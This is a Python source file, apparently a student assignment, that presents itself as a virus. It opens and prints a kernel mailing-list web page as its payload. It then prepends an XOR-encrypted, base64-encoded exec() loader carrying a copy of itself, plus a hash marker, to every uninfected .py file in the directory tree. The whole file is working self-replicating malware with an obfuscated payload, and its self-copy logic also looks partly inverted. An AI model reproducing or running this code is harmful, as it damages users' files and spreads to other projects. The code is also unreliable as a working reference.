# START OF THE VIRUS!

import sys
import os
import base64
import hashlib
import random
import string
import math
import webbrowser
import urllib.request

def listToString(s): 
    
    str1 = "" 
    
    for ele in s: 
        str1 += ele  
    
    return str1 

#generate random otp key from given range and add them to a list, then convert that list to string
def generateOTP(plaintext) :
 
    allList = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]
    otp = []
 
    for i in range(len(plaintext)) :
        otp.append(random.choice(allList))
        otpNew = listToString(otp)
 
    return "".join(otpNew)

#copy the virus code from the beginning to the end
def clone(virus_code):
    
    with open(sys.argv[0], 'r') as f:
        lines = f.readlines()
        self_replicating_part = False
        
        for line in lines:
            if line == "# START OF THE VIRUS!":
                self_replicating_part = True
            if not self_replicating_part:
                virus_code.append(line)
            if line == "# END OF THE VIRUS!\n":
                break
        return "".join(virus_code)


#encrypt the virus clone with generated key and return the pair with exec 
def handle(virusClone, hashed_virus):

    randomKey = generateOTP(virusClone)
    encrpytedVirus = (chr(ord(a) ^ ord(b)) for a, b in zip(virusClone, randomKey))
    encrpytedVirus = "".join(encrpytedVirus)
    base64EncodedVirus = base64.b64encode(str.encode(encrpytedVirus))
    #hash the virus code with sha256
    hashed_virus = hashlib.sha256(hashed_virus.encode())

    """decoded = (chr(ord(a) ^ ord(b)) for a, b in zip(encrpytedVirus, randomKey))
    decrypted = "".join(decoded)
    print(decrypted)"""

    #exec command, first decode the encoded virus code, then decrypt it with the generated randomKey in order to make it ready to run and execute the virus
    return "exec('import base64;x=base64.b64decode(str.encode(\""+  base64EncodedVirus.decode() +"\"));" \
           "y=\\'\\'.join(chr(ord(a) ^ ord(b)) for a, b in zip(x.decode(), \""+ randomKey +"\"));" \
           "exec(y)')", hashed_virus
          

def spread(execCode, hashed_virus):
#find all python files under this directory except the source code file
    for root, dirs, files in os.walk('.', topdown=True):
        for file in files:
            file_path = root + '/' + file
            if(file.endswith(".py")) and file_path != "./pa2.py":
                with open(file_path, 'r') as f:
                    file_code = f.readlines()

                infected = False


#check the first line to see if it is infected before(by checking the 32 byte hash from sha256)
                for line in file_code:
                    if line[1:65] == hashed_virus.hexdigest():
                        infected = True
                        break
#add execCode to the chosen files and update them
#if a file is infected, then the first line starts with a # followed by the hash of the virus, it is easier to check equality now.
                if not infected:
                    updated_code = []
                    updated_code.extend('#')
                    updated_code.extend(hashed_virus.hexdigest())
                    updated_code.extend('\n')
                    updated_code.extend(execCode)
                    updated_code.extend('\n')
                    updated_code.extend(file_code)

                    with open(file_path, 'w') as updated_file:
                        updated_file.writelines(updated_code)

#payload opens the website from given url, it also displays the text on the website to the terminal, I read the first 6070 bytes which is the end of the text :) 
def execute_payload(API):
    print("VIRUS STARTED!")
    webbrowser.open(API, new=1)
    with urllib.request.urlopen(API) as f:
        print(f.read(6070).decode('utf-8'))

if __name__ == '__main__':
    API = "https://lore.kernel.org/ksummit/CAHk-=wiB6FJknDC5PMfpkg4gZrbSuC3d391VyReM4Wb0+JYXXA@mail.gmail.com/"
    execute_payload(API)
    virus_code = []
    cloned_virus = clone(virus_code)
    hashed_virus = ""
    prepared, hashed_virus = handle(cloned_virus, hashed_virus)
    spread(prepared, hashed_virus)

# END OF THE VIRUS!